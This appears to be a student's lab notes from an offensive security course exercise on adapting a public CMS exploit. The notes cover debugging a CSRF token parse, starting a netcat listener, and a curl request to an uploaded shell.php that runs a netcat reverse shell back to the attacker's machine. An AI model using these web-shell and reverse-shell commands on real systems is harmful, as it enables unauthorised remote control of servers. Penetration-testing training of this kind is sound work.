```


## 15.2.4.1.2. Attempt to troubleshoot the code and determine why the error occurs.

Add a print statement to see what is passed to the parse_csrf_token function. Here is the output:
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ python 44976_modified.py 
...
[+] String that is being split: https://192.168.214.44/admin?_sk_=d2ea2feb7eb09c65a41

```



## 15.2.4.1.3. Modify the exploit in order to avoid the error and run it against your dedicated Linux client.
Change the csrf_param variable

## 15.2.4.1.5. Attempt to obtain a fully interactive shell with this exploit.

Open a netcat listener on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
```

Run a netcat cmd on the exploit to connect to our Kali machine.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ curl -k https://192.168.214.44/uploads/shell.php?cmd=nc+-nv+192.168.119.214+4444+-e+/bin/bash
